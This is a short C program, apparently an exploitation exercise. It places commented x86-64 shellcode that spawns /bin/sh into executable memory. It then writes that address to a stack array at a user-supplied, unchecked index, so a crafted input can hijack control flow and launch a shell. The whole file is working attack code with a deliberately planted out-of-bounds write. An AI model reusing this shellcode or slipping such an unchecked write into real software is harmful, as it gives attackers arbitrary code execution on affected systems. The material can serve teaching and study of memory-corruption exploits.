#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>



const char careful[] =
	"\x90"
        "\x48\x31\xc0"                               // xor    %rax,%rax
        "\x99"                                       // cltd
        "\xb0\x3b"                                   // mov    $0x3b,%al //the syscall number
        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi //this loads **/bin/sh little endian
        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi //this as the string terminator
        "\x57"                                       // push   %rdi
        "\x48\x89\xe7"                               // mov    %rsp,%rdi
        "\x52"                                       // push   %rdx
        "\x57"                                       // push   %rdi
        "\x48\x89\xe6"                               // mov    %rsp,%rsi
        "\x0f\x05";                                  // syscall


char* p;

void function(int x){
unsigned long v[1024];
v[x] = (unsigned long)p;
}


int main(int argc, char** argv){
  int x;

  p = mmap(0,4096, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
  if (!p){
	printf("no memory\n");
	exit(EXIT_FAILURE);
  }
  memcpy(p,careful,sizeof(careful));
  scanf("%d",&x);
  printf("x is %d\n",x);
  function(x);
  printf("I did the job\n");
}
